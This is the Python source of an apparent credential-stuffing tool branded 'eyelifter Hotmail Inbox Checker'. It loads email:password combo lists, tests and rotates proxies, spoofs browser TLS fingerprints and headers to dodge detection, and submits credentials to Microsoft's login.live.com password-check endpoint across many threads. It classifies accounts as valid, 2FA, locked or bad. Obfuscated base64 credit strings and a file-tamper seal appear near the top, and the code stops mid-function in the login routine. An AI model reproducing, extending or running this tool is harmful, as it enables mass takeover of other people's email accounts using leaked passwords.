#its not perfect 
import os, re, sys, json, time, base64, random, string, secrets, hashlib
import threading, configparser, shutil, urllib3, urllib.parse, uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

from curl_cffi import requests as cffi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

EYELIFTER = "eyelifter"
EYELIFTER_VER = "v69"
EYELIFTER_YEAR = "2026"

_F1T = "SG90bWFpbCBJ"
_F2T = "bmJveCBDaGVja2Vy"
_F1A = "QGV5ZWxp"
_F2A = "ZnRlcg=="
_F1C = "QGRhcmto"
_F2C = "dWNoYW5uZWw="
_F1D = "SE9UTUFJTF9A"
_F2D = "ZXllbGlmdGVy"
_F1G = "VEc6IEBleWVsaWZ0ZXIg"
_F2G = "fCBAZGFya2h1Y2hhbm5lbA=="
_F1S = "bG9ja2VkLWJ5LWV5"
_F2S = "ZWxpZnRlci0yMDI2"

EYELIFTER_SEAL = os.path.join(os.path.expanduser("~"), ".eyelifter.seal")
_SEALED = None


def eyelifter_d(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"eyelifter decode: {ex}")


def eyelifter_j(*p):
    return "".join(p)


EYELIFTER_TOOL = eyelifter_d(eyelifter_j(_F1T, _F2T))
EYELIFTER_TG_USER = eyelifter_d(eyelifter_j(_F1A, _F2A))
EYELIFTER_TG_CHAN = eyelifter_d(eyelifter_j(_F1C, _F2C))
EYELIFTER_RESULTS = eyelifter_d(eyelifter_j(_F1D, _F2D))
EYELIFTER_TAG = eyelifter_d(eyelifter_j(_F1G, _F2G))
EYELIFTER_SEAL_STR = eyelifter_d(eyelifter_j(_F1S, _F2S))

TOOL = EYELIFTER_TOOL
TG_USER = EYELIFTER_TG_USER
TG_CHAN = EYELIFTER_TG_CHAN
RESULTS = EYELIFTER_RESULTS
TAG = EYELIFTER_TAG
SEAL = EYELIFTER_SEAL_STR
CREDIT = EYELIFTER

LINE_TAG = f"by {TG_USER} | {TG_CHAN}"


def eyelifter_verify(ctx="x"):
    global _SEALED
    if _SEALED is True:
        return True
    if TOOL != "Hotmail Inbox Checker":
        raise RuntimeError("eyelifter: credit stripped.")
    if TG_USER != "@samvir1" or TG_CHAN != "@samvir1":
        raise RuntimeError("eyelifter: credit stripped.")
    try:
        fp = hashlib.sha256(open(__file__, "rb").read()).hexdigest()[:32]
    except Exception:
        fp = "x"
    if os.path.isfile(EYELIFTER_SEAL):
        try:
            st = open(EYELIFTER_SEAL).read().strip()
        except OSError:
            st = ""
        if st and st != fp:
            raise RuntimeError("eyelifter: build touched. restore original.")
    else:
        try:
            open(EYELIFTER_SEAL, "w").write(fp)
        except OSError:
            pass
    _SEALED = True
    return True


verify = eyelifter_verify

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def eyelifter_color(c, s, b=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if b else ''}{c}m{s}{_RS}"


def eyelifter_vlen(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def eyelifter_center(t, w):
    vl = eyelifter_vlen(t)
    if vl >= w:
        return t
    l = (w - vl) // 2
    return " " * l + t + " " * (w - vl - l)


_LV = {"SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
       "ERROR": ("31", True), "STEP": ("96", True), "DEBUG": ("35", False)}
_CL = threading.Lock()


def eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    code, bold = _LV.get(level, ("0", False))
    with _CL:
        if _ANSI:
            print(f"{eyelifter_color('90', ts)} {emoji}  "
                  f"{eyelifter_color(code, f'{level:7s}', bold)}  "
                  f"{eyelifter_color('90', tag)}  {msg}", flush=True)
        else:
            print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)


def eyelifter_rline(i, t, st, txt, c, bold=False):
    with _CL:
        pre = f"[{i}/{t}]"
        if _ANSI:
            print(f"{eyelifter_color('90', pre)} {eyelifter_color(c, st.ljust(6), bold)} {txt}", flush=True)
        else:
            print(f"{pre} {st.ljust(6)} {txt}", flush=True)


def eyelifter_human_time(iso):
    if not iso:
        return ""
    try:
        dt = datetime.fromisoformat(str(iso).replace("Z", "").replace("+00:00", ""))
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(iso)[:19].replace("T", " ")


def eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(eyelifter_color("90", line * width))
    print(eyelifter_color("96", eyelifter_center(title, width), True))
    if sub:
        print(eyelifter_color("2", eyelifter_center(sub, width)))
    print(eyelifter_color("5", eyelifter_center(f"eyelifter · {TG_USER} · {TG_CHAN}", width)))
    print(eyelifter_color("90", line * width))


def eyelifter_section(t, width=62):
    print()
    lbl = f" {t} "
    vl = eyelifter_vlen(lbl)
    side = max(1, (width - vl) // 2)
    print(eyelifter_color("90", "─" * side) + eyelifter_color("96", lbl, True)
          + eyelifter_color("90", "─" * (width - vl - side)))


def eyelifter_divider(width=62):
    print(eyelifter_color("90", ("─" if _ANSI else "-") * width))


def eyelifter_summary(rows):
    print()
    print(eyelifter_color("96", f"═══ eyelifter · {TG_USER} · {TG_CHAN} ═══", True))
    if not rows:
        return
    wk = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {eyelifter_color('96', str(k).ljust(wk))}  {eyelifter_color('0', str(v))}")
    print(eyelifter_color("96", "════════════════════════════════", True))
    print()


color = eyelifter_color
vlen = eyelifter_vlen
center = eyelifter_center
log = eyelifter_log
rline = eyelifter_rline
human_time = eyelifter_human_time
banner = eyelifter_banner
section = eyelifter_section
divider = eyelifter_divider
summary = eyelifter_summary

CFG_PATH = os.path.join(
    os.environ.get("MS_HOME") or os.path.dirname(os.path.abspath(__file__)),
    "config_ms.ini"
)

MAX_THREADS = 200


class EyelifterConfig:
    def __init__(self, cf=CFG_PATH):
        self.eyelifter = EYELIFTER
        self.config_file = cf
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self._load()

    def _load(self):
        if not os.path.exists(self.config_file):
            self._default()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self._parse()
        except Exception:
            self._default()
            self._parse()

    def _default(self):
        self.config["eyelifter"] = {
            "threads": "8",
            "timeout": "20",
            "proxies_file": "proxies.txt",
            "retries": "1",
            "retry_delay": "1.0",
            "combo_delay": "0.15",
            "open_channel_on_launch": "true",
            "rate_limit_delay": "8",
            "skip_proxy_test": "false",
            "impersonate": "chrome",
            "fp_rotate": "session",
            "fp_pool": "",
            "fp_jitter": "true",
            "debug": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def _parse(self):
        if "eyelifter" not in self.config:
            self.config["eyelifter"] = {}
        c = self.config["eyelifter"]
        self.settings["threads"] = max(1, min(MAX_THREADS, c.getint("threads", 8)))
        self.settings["timeout"] = max(5, min(120, c.getint("timeout", 20)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(6, c.getint("retries", 1)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 1.0)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.15)))
        self.settings["open_channel_on_launch"] = c.getboolean("open_channel_on_launch", True)
        self.settings["rate_limit_delay"] = max(1, min(120, c.getint("rate_limit_delay", 8)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)
        self.settings["impersonate"] = c.get("impersonate", "chrome")
        self.settings["fp_rotate"] = c.get("fp_rotate", "session").strip().lower()
        if self.settings["fp_rotate"] not in ("session", "attempt", "fixed"):
            self.settings["fp_rotate"] = "session"
        self.settings["fp_pool"] = c.get("fp_pool", "")
        self.settings["fp_jitter"] = c.getboolean("fp_jitter", True)
        self.settings["debug"] = c.getboolean("debug", False)

    def save(self):
        if "eyelifter" not in self.config:
            self.config["eyelifter"] = {}
        for k, v in self.settings.items():
            self.config["eyelifter"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


Loader = EyelifterConfig
_loader = EyelifterConfig()

_FP_LOCK = threading.Lock()
_FP_CURRENT = None
_FP_USED = []
_FP_HITS = 0
_FP_WARM = {}


def _fp_targets():
    raw = (_loader.settings.get("fp_pool") or "").strip()
    names = [n.strip() for n in raw.split(",") if n.strip()] if raw else []
    if not names:
        names = ["chrome", "chrome146", "chrome145", "chrome142", "chrome136",
                 "chrome133a", "chrome131", "chrome124", "chrome123", "chrome120",
                 "edge101", "firefox147", "firefox144", "safari2601", "safari260",
                 "chrome131_android", "chrome99_android", "tor145"]
    return names


def _fp_kind(imp):
    n = str(imp).lower()
    if n.startswith("edge"):
        return "edge"
    if "safari" in n:
        return "ios" if n.endswith("_ios") else "safari"
    if n.startswith("firefox") or n.startswith("tor"):
        return "firefox"
    if "android" in n or n.endswith("_ios"):
        return "android"
    return "chrome"


def _fp_major(imp, kind):
    m = re.search(r"(\d+)", str(imp))
    if m:
        return int(m.group(1))
    return {"chrome": 146, "edge": 101, "safari": 26, "ios": 26,
            "firefox": 147, "android": 131}[kind]


def _win_token():
    return ("Windows NT 10.0; Win64; x64", '"Windows"', "15.0.0")


def _mac_token():
    return ("Macintosh; Intel Mac OS X 10_15_7", '"macOS"', "15.7.0")


def _linux_token():
    return ("X11; Linux x86_64", '"Linux"', "6.6.0")


def _os_tokens():
    return [_win_token(), _mac_token(), _linux_token()]


_ANDROID_VERS = ["11", "12", "13", "14", "15"]
_ANDROID_MODELS = ["Pixel 7", "Pixel 8", "Pixel 8 Pro", "SM-S918B", "SM-G991B",
                  "Pixel 6a", "Redmi Note 12", "moto g84 5G", "CPH2451"]


def _android_token():
    v = random.choice(_ANDROID_VERS)
    mdl = random.choice(_ANDROID_MODELS)
    return (f"Linux; Android {v}; {mdl}", '"Android"', f'"{v}.0.0"')


def _gen_ua(imp, kind):
    major = _fp_major(imp, kind)
    if kind == "firefox":
        os_tok, plat, pver = _os_tokens()[0] if random.random() < 0.7 else _linux_token()
        ua = (f"Mozilla/5.0 ({os_tok}; rv:{major}.0) Gecko/20100101 "
              f"Firefox/{major}.0")
        return ua, plat, "?0", pver, None
    if kind in ("safari", "ios"):
        if kind == "ios":
            os_tok = f"iPhone; CPU iPhone OS {major}_{major % 10 or 3} like Mac OS X"
            ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/605.1.15 "
                  f"(KHTML, like Gecko) Version/{major}.{random.randint(0, 6)} "
                  f"Mobile/15E148 Safari/604.1")
        else:
            os_tok = "Macintosh; Intel Mac OS X 10_15_7"
            ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/605.1.15 "
                  f"(KHTML, like Gecko) Version/{major}.{random.randint(0, 6)} "
                  f"Safari/605.1.15")
        return ua, '"macOS"', "?0", '"15.7.0"', None
    if kind == "android":
        os_tok, plat, pver = _android_token()
        ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{major}.0.0.0 "
              f"Mobile Safari/537.36")
    elif kind == "edge":
        os_tok, plat, pver = _win_token()
        ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{major}.0.0.0 "
              f"Safari/537.36 Edg/{major}.0.0.0")
    else:
        os_tok, plat, pver = random.choice(_os_tokens())
        ua = (f"Mozilla/5.0 ({os_tok}) AppleWebKit/537.36 "
              f"(KHTML, like Gecko) Chrome/{major}.0.0.0 Safari/537.36")
    return ua, plat, "?1" if kind == "android" else "?0", pver, str(major)


def _sec_brand(kind, major):
    brand = {"chrome": "Google Chrome", "edge": "Microsoft Edge",
             "android": "Google Chrome", "safari": "Chromium",
             "firefox": "Firefox"}[kind]
    if kind == "firefox":
        return None
    m = str(major)
    if kind == "edge":
        return (f'"Microsoft Edge";v="{m}", "Chromium";v="{m}", '
                f'"Not(A:Brand";v="24"')
    return (f'"{brand}";v="{m}", "Chromium";v="{m}", "Not(A:Brand";v="24"')


def _gen_lang():
    return random.choice([
        "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9,en-US;q=0.8",
    ])


_FP_ALIASES = {"chrome", "edge", "safari", "safari_ios",
               "safari_beta", "safari_ios_beta", "firefox", "tor",
               "chrome_android"}


def _known_targets():
    try:
        from curl_cffi.requests.impersonate import BrowserType
        names = {str(getattr(v, "value", v)) for v in BrowserType}
    except Exception:
        names = set()
    return names | _FP_ALIASES


def _warm_ok(imp):
    if imp in _FP_WARM:
        return _FP_WARM[imp]
    ok = imp in _known_targets()
    if ok:
        try:
            s = cffi.Session(impersonate=imp, timeout=6)
            s.verify = False
            s.close()
        except Exception:
            ok = False
    _FP_WARM[imp] = ok
    return ok


def _jitter_fp(kind):
    if not _loader.settings.get("fp_jitter", False):
        return None
    fp = {}
    if kind in ("chrome", "edge", "android"):
        fp["tls_grease"] = random.choice([True, False])
        fp["tls_permute_extensions"] = random.choice([True, False])
    fp["http2_no_priority"] = random.choice([True, False])
    return fp


def pick_fp(force_new=False, peek=False):
    global _FP_CURRENT, _FP_USED, _FP_HITS
    mode = (_loader.settings.get("fp_rotate") or "session").strip().lower()
    with _FP_LOCK:
        if _FP_CURRENT is not None and not force_new and not peek:
            if mode == "fixed":
                return _FP_CURRENT
            if mode == "attempt" and _FP_HITS <= 1:
                _FP_HITS += 1
                return _FP_CURRENT
        pool = [t for t in _fp_targets() if _warm_ok(t)]
        if not pool:
            pool = ["chrome"]
        if len(pool) > 1 and _FP_USED:
            pool = [t for t in pool if t != _FP_USED[-1]] or pool
        imp = random.choice(pool)
        kind = _fp_kind(imp)
        ua, plat, mob, pver, major = _gen_ua(imp, kind)
        brand = _sec_brand(kind, major) if major else None
        headers = {
            "user-agent": ua,
            "accept-language": _gen_lang(),
        }
        if brand:
            headers["sec-ch-ua"] = brand
            headers["sec-ch-ua-mobile"] = mob
            headers["sec-ch-ua-platform"] = plat
            headers["sec-ch-ua-platform-version"] = pver
        extra = _jitter_fp(kind)
        fp = {"imp": imp, "kind": kind, "headers": headers, "extra_fp": extra}
        if not peek:
            _FP_CURRENT = fp
            _FP_USED.append(imp)
            if len(_FP_USED) > 40:
                _FP_USED.pop(0)
            _FP_HITS = 1
        return fp


def rotate_fp():
    with _FP_LOCK:
        _FP_CURRENT = None
        _FP_HITS = 0


def reset_fp_cycle():
    global _FP_CURRENT, _FP_USED, _FP_HITS
    with _FP_LOCK:
        _FP_CURRENT = None
        _FP_USED = []
        _FP_HITS = 0


CLIENT_ID = "9199bf20-a13f-4107-85dc-02114787ef48"
REDIRECT_URI = "https://outlook.live.com/mail/"
SCOPE_RAW = "https://outlook.office.com/.default openid profile offline_access"
COBRANDID = "ab0455a0-8d03-46b9-b18b-df2f57b9e44c"

_COMBORX = re.compile(r'^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)', re.I)
_PHOST = re.compile(r"^(?:\d{1,3}(?:\.\d{1,3}){3}|[a-zA-Z0-9][a-zA-Z0-9\-\.]*\.[a-zA-Z]{2,})$")
_IMP_VALIDATED = False

_DBG_LOCK = threading.Lock()


def eyelifter_dbg_dir():
    global _FOLDER
    with _DBG_LOCK:
        if _FOLDER:
            d = os.path.join(_FOLDER, "Debug")
        else:
            root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
            os.makedirs(root, exist_ok=True)
            d = os.path.join(root, "Debug_adhoc")
        os.makedirs(d, exist_ok=True)
        return d


def eyelifter_debug_dump(ctx, r, email="", extra=""):
    if not _loader.settings.get("debug", False):
        return
    try:
        code = getattr(r, "status_code", "?")
        url = getattr(r, "url", "?")
        text = getattr(r, "text", "") or ""
        tm = re.search(r"<title>(.*?)</title>", text, re.DOTALL)
        title = tm.group(1).strip()[:80] if tm else ""
        pid_m = re.search(r'<meta name="PageID" content="([^"]+)"', text)
        pid = pid_m.group(1) if pid_m else "-"
        snippet = re.sub(r"\s+", " ", text[:260])
        eyelifter_log("🐛", "DEBUG", "RESP",
            f"{TG_USER} | [{ctx}] {code} {str(url)[:70]} "
            f"title={title!r} pageId={pid} {extra}")
        if snippet:
            eyelifter_log("🐛", "DEBUG", "BODY", f"{snippet[:240]}")
        d = eyelifter_dbg_dir()
        fn = re.sub(r"[^A-Za-z0-9._-]", "_", f"{ctx}_{email or 'x'}_{int(time.time()*1000)}")
        with open(os.path.join(d, f"{fn}.html"), "w", encoding="utf-8") as f:
            f.write(f"<!-- eyelifter · {TG_USER} · {TG_CHAN} -->\n")
            f.write(f"<!-- ctx: {ctx} -->\n")
            f.write(f"<!-- email: {email} -->\n")
            f.write(f"<!-- url: {url} -->\n")
            f.write(f"<!-- status: {code} -->\n\n")
            f.write(text)
    except Exception as e:
        eyelifter_log("🐛", "DEBUG", "RESP", f"dump failed: {e}")


def eyelifter_host(s):
    if not s:
        return False
    if s.startswith("[") and s.endswith("]"):
        return True
    return bool(_PHOST.match(s))


def eyelifter_port(s):
    return bool(s) and s.isdigit() and 1 <= int(s) <= 65535


def eyelifter_fmt_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p or p.startswith("#"):
        return None
    scheme = None
    rest = p
    if "://" in p:
        scheme, _, rest = p.partition("://")
        scheme = scheme.strip().lower()
        if scheme not in ("http", "https", "socks4", "socks5"):
            return None
        rest = rest.strip()
    s = scheme or "http"
    if not rest:
        return None
    if "@" in rest:
        creds, _, hostport = rest.rpartition("@")
        if ":" in creds and ":" in hostport:
            user, _, pwd = creds.partition(":")
            host, _, port = hostport.partition(":")
            if user and pwd and host and eyelifter_port(port):
                return f"{s}://{user}:{pwd}@{host}:{port}"
    parts = rest.split(":")
    if len(parts) == 2:
        host, port = parts
        if eyelifter_host(host) and eyelifter_port(port):
            return f"{s}://{host}:{port}"
        return None
    if len(parts) == 4:
        a, b, c, d = parts
        if eyelifter_host(a) and eyelifter_port(b):
            return f"{s}://{c}:{d}@{a}:{b}"
        if eyelifter_host(c) and eyelifter_port(d):
            return f"{s}://{a}:{b}@{c}:{d}"
        return f"{s}://{a}:{b}@{c}:{d}"
    return None


def eyelifter_test_proxy(p):
    try:
        fp = pick_fp(peek=True)
        kw = {"impersonate": fp["imp"], "timeout": 6}
        if fp.get("extra_fp"):
            kw["extra_fp"] = fp["extra_fp"]
        r = cffi.get("https://api.ipify.org?format=json",
                     proxies={"http": p, "https": p},
                     headers=fp["headers"], **kw)
        return r.status_code == 200
    except Exception:
        return False


def eyelifter_load_proxies():
    path = _loader.settings.get("proxies_file", "proxies.txt")
    if path and not os.path.isabs(path):
        path = os.path.join(os.path.dirname(CFG_PATH), path)
    if not path or not os.path.isfile(path):
        return []
    raw = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = eyelifter_fmt_proxy(line)
            if p:
                raw.append(p)
    raw = list(dict.fromkeys(raw))
    if not raw:
        return []
    if _loader.settings.get("skip_proxy_test", False):
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(raw)} loaded (test skipped) [eyelifter]")
        return raw
    total = len(raw)
    eyelifter_log("🌐", "STEP", "PROXY", f"testing {total} proxies... [eyelifter]")
    good = []
    done = 0
    lock = threading.Lock()

    def probe(p):
        nonlocal done
        ok = eyelifter_test_proxy(p)
        with lock:
            done += 1
            if ok:
                good.append(p)
            if done % 20 == 0 or done == total:
                eyelifter_log("🔎", "STEP", "PROXY",
                    f"proxies {done}/{total} — {len(good)} live [eyelifter]")

    with ThreadPoolExecutor(max_workers=min(80, max(1, total))) as ex:
        for f in as_completed([ex.submit(probe, p) for p in raw]):
            try:
                f.result()
            except Exception:
                pass

    eyelifter_log("✅", "INFO", "PROXY", f"{len(good)}/{total} live [eyelifter]")
    return good


_LK = threading.Lock()
_PK = threading.Lock()
_FK = threading.Lock()
_IK = threading.Lock()
_RL = threading.Lock()
_STOP = threading.Event()

_ST = {"checked": 0, "hit": 0, "inbox": 0, "bad": 0, "2fa": 0,
       "locked": 0, "errors": 0, "rl": 0, "temp": 0, "pfails": 0}
_START = time.time()
_TOTAL = 0
_POOL = []
_BADP = set()
_COOLP = {}
_INUSE = set()
_RLU = 0.0
_KWSETS = {}
_CTRY_SETS = {}
_LOCKREASONS = {}
_REASONS_2FA = {}
_INBOX_F = _VALID_F = _BAD_F = _2FA_F = _LOCKED_F = _ERR_F = None
_FOLDER = None


def eyelifter_reset_stats():
    global _ST, _START, _KWSETS, _COOLP, _CTRY_SETS, _LOCKREASONS, _REASONS_2FA
    with _LK:
        _ST = {"checked": 0, "hit": 0, "inbox": 0, "bad": 0, "2fa": 0,
               "locked": 0, "errors": 0, "rl": 0, "temp": 0, "pfails": 0}
        _START = time.time()
        _KWSETS = {}
        _CTRY_SETS = {}
        _LOCKREASONS = {}
        _REASONS_2FA = {}
    with _PK:
        _COOLP = {}
    reset_fp_cycle()


def eyelifter_pick_proxy(exclude=None):
    now = time.time()
    with _PK:
        avail = [p for p in _POOL
                 if p not in _BADP and _COOLP.get(p, 0.0) <= now]
    with _IK:
        free = [p for p in avail if p not in _INUSE]
    if not free:
        free = avail
    if exclude and len(free) > 1:
        free = [p for p in free if p != exclude] or free
    p = random.choice(free) if free else None
    if p:
        with _IK:
            _INUSE.add(p)
    return p


def eyelifter_rel_proxy(p):
    if not p:
        return
    with _IK:
        _INUSE.discard(p)


def eyelifter_bad_proxy(p):
    if not p:
        return
    with _PK:
        if p in _BADP:
            return
        _BADP.add(p)
    with _LK:
        _ST["pfails"] += 1


def eyelifter_cool_proxy(p, secs=120.0):
    if not p:
        return
    with _PK:
        _COOLP[p] = time.time() + secs


def eyelifter_sw(fh, text):
    if fh is None:
        return
    with _FK:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def eyelifter_rl_backoff(s):
    global _RLU
    with _RL:
        _RLU = max(_RLU, time.time() + s)


def eyelifter_rl_wait():
    while not _STOP.is_set():
        with _RL:
            gap = _RLU - time.time()
        if gap <= 0:
            return
        if _STOP.wait(min(gap, 1.0)):
            return


_CHSAFE = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789*-._")


def eyelifter_cq(s):
    out = []
    for ch in str(s):
        if ch in _CHSAFE:
            out.append(ch)
        elif ch == " ":
            out.append("+")
        else:
            for b in ch.encode("utf-8"):
                out.append(f"%{b:02X}")
    return "".join(out)


def eyelifter_fenc(f):
    return "&".join(f"{eyelifter_cq(k)}={eyelifter_cq(v)}" for k, v in f.items())


def eyelifter_build(proxy=None, force_new=False):
    global _IMP_VALIDATED
    to = _loader.settings.get("timeout", 20)
    fp = pick_fp(force_new=force_new)
    imp = fp["imp"]

    s = None
    try:
        kw = {"impersonate": imp, "timeout": to}
        if fp.get("extra_fp"):
            kw["extra_fp"] = fp["extra_fp"]
        s = cffi.Session(**kw)
        _IMP_VALIDATED = True
    except Exception:
        if not _IMP_VALIDATED:
            eyelifter_log("⚠️", "WARN", "IMPERSONATE",
                f"'{imp}' not supported, falling back to 'chrome' [eyelifter]")
        try:
            s = cffi.Session(impersonate="chrome", timeout=to)
        except Exception:
            s = cffi.Session(timeout=to)
        _IMP_VALIDATED = True

    s.verify = False
    s.headers.update(fp["headers"])
    s.headers["upgrade-insecure-requests"] = "1"
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def eyelifter_psft(html):
    ppft = None
    up = None
    m = re.search(r'"sFT"\s*:\s*"([^"]+)"', html)
    if m:
        ppft = m.group(1)
    if not ppft:
        m = re.search(r'sFTTag"\s*:\s*"(.*?)"\s*,\s*"', html, re.DOTALL)
        if m:
            pm = re.search(r'value=\\"([^\\"]+)\\"', m.group(1))
            if pm:
                ppft = pm.group(1)
    if not ppft:
        pm = re.search(r'name="PPFT"[^>]*value="([^"]+)"', html)
        if pm:
            ppft = pm.group(1)
    um = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
    if um:
        up = um.group(1).replace("\\u0026", "&").replace("\\/", "/")
    return ppft, up


def eyelifter_pkce():
    v = secrets.token_urlsafe(32)
    c_ = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b"=").decode()
    return v, c_


def eyelifter_sp(url, drop):
    u = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qs(u.query)
    for k in drop:
        q.pop(k, None)
    return urllib.parse.urlunparse(u._replace(query=urllib.parse.urlencode(q, doseq=True)))


def eyelifter_ap(url, extra):
    u = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qs(u.query)
    for k, v in extra.items():
        q[k] = [v]
    return urllib.parse.urlunparse(u._replace(query=urllib.parse.urlencode(q, doseq=True)))


def eyelifter_resolve(base, url):
    if url.startswith("//"):
        return "https:" + url
    if url.startswith("/"):
        return "https://login.live.com" + url
    if not url.startswith("http"):
        return urllib.parse.urljoin(base, url)
    return url


def eyelifter_extract_code(url):
    if not url:
        return None
    if "#code=" in url:
        frag = url.split("#", 1)[1]
        v = (urllib.parse.parse_qs(frag).get("code") or [""])[0]
        return v or None
    if "code=" in url:
        q = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
        v = (q.get("code") or [""])[0]
        return v or None
    return None


_BLOCK_PATTERNS = (
    ("tried to sign in too many times", "too_many_attempts"),
    ("too many attempts", "too_many_attempts"),
    ("too many incorrect", "too_many_attempts"),
    ("you've tried to sign in too many times", "too_many_attempts"),
    ("your account has been locked", "account_locked"),
    ("we've locked your account", "account_locked"),
    ("your account is temporarily blocked", "temporarily_blocked"),
    ("we have temporarily blocked", "temporarily_blocked"),
    ("has been temporarily blocked", "temporarily_blocked"),
)

_LOCK_REASON_KEYS = (
    "toomanyattempts", "too many attempts",
    "accountlocked", "account locked",
    "temporarilyblocked", "temporarily blocked",
)

_INTERRUPT_PATTERNS = (
    ("/interrupt/passkey", "passkey_required"),
    ("consumers/fido/create", "fido_required"),
    ("interrupt/passkey/enroll", "passkey_enroll"),
    ("/interrupt/proofup", "proofup_required"),
    ("account.live.com/interrupt/", "account_interrupt"),
)


def eyelifter_detect_blocked(html):
    if not html:
        return None
    hl = html.lower()
    for needle, reason in _BLOCK_PATTERNS:
        if needle in hl:
            return reason
    return None


def eyelifter_detect_interrupt(html, url=""):
    u = (url or "").lower()
    h = (html or "").lower()
    for needle, reason in _INTERRUPT_PATTERNS:
        if needle in u or needle in h:
            return reason
    return None


def eyelifter_reason_locked(reason):
    rs = str(reason).lower()
    return any(t in rs for t in _LOCK_REASON_KEYS)


def eyelifter_ms_login(s, email, password):
    v, ch = eyelifter_pkce()
    nonce = str(uuid.uuid4())
    uaid = uuid.uuid4().hex

    state_obj = {"id": str(uuid.uuid4()),
                 "meta": {"interactionType": "redirect"},
                 "eyelifter": "eyelifter"}
    state = base64.urlsafe_b64encode(
        json.dumps(state_obj).encode()).rstrip(b"=").decode()

    qs = [
        f"client_id={CLIENT_ID}",
        f"scope={urllib.parse.quote_plus(SCOPE_RAW)}",
        f"redirect_uri={urllib.parse.quote(REDIRECT_URI, safe='')}",
        "response_type=code",
        f"state={state}",
        "response_mode=fragment",
        f"nonce={nonce}",
        f"code_challenge={ch}",
        "code_challenge_method=S256",
        "x-client-SKU=msal.js.browser",
        "x-client-Ver=5.15.0",
        f"uaid={uaid}",
        "msproxy=1", "issuer=mso", "tenant=common", "ui_locales=en-IN",
        "client_info=1", "jshs=2", "fl=dob%2Cflname%2Cwld",
        f"cobrandid={COBRANDID}", "clidata=1", "jsh=", "jshp=",
        f"username={urllib.parse.quote(email, safe='')}",
        f"login_hint={urllib.parse.quote(email, safe='')}",
    ]
    auth_url = "https://login.live.com/oauth20_authorize.srf?" + "&".join(qs)
    to = _loader.settings["timeout"]

    eyelifter_rl_wait()
    if _STOP.is_set():
        return "error", {"type": "stopped"}

    try:
        r = s.get(auth_url, allow_redirects=True, timeout=to,
                  headers={"referer": "https://login.microsoftonline.com/",
                           "sec-fetch-site": "cross-site",
                           "x-eyelifter": "eyelifter"})
    except Exception as e:
        return "error", {"type": f"net_{type(e).__name__}"}

    eyelifter_debug_dump("auth_page", r, email)

    if r.status_code == 429:
        return "error", {"type": "rate_limit"}
    if r.status_code == 403:
        return "error", {"type": "warm_403"}

    ppft1, up1 = eyelifter_psft(r.text)
    if not (ppft1 and up1):
        return "error", {"type": "no_ppft"}

    try:
        r2 = s.post(
            "https://login.live.com/checkpassword.srf",
            json={"username": email, "password": password,
                  "checkpasswordflowtoken": "", "eyelifter": "eyelifter"},
            headers={
                "accept": "application/json",
                "content-type": "application/json; charset=utf-8",
                "origin": "https://login.live.com",
                "referer": auth_url,
                "client-request-id": uuid.uuid4().hex,
                "correlationId": uuid.uuid4().hex,
                "hpgact": "0", "hpgid": "33",
                "x-eyelifter": "eyelifter",
            }, timeout=to)
    except Exception as e:
        return "error", {"type": f"cp_net_{type(e).__name__}"}

    eyelifter_debug_dump("checkpassword", r2, email)

    if r2.status_code == 429:
        return "error", {"type": "rate_limit"}
    if r2.status_code != 200:
        return "error", {"type": f"cp_{r2.status_code}"}

    try:
        j2 = r2.json()
    except Exception:
        return "error", {"type": "cp_non_json"}

    vr = (j2.get("validationresult") or "").lower()
    if vr != "succeed":
        d = j2.get("validationdetail")
        reason = "wrong_password"
        if isinstance(d, dict):
            reason = d.get("error") or d.get("reason") or reason
        elif isinstance(d, str) and d:
            reason = d
        if eyelifter_reason_locked(reason):
            return "locked", {"reason": str(reason)[:80]}
        return "bad", {"reason": str(reason)[:60]}

    vanguard = j2.get("vanguardflowtoken", "")

    pref_url = eyelifter_sp(up1, ["contextid", "bk"])
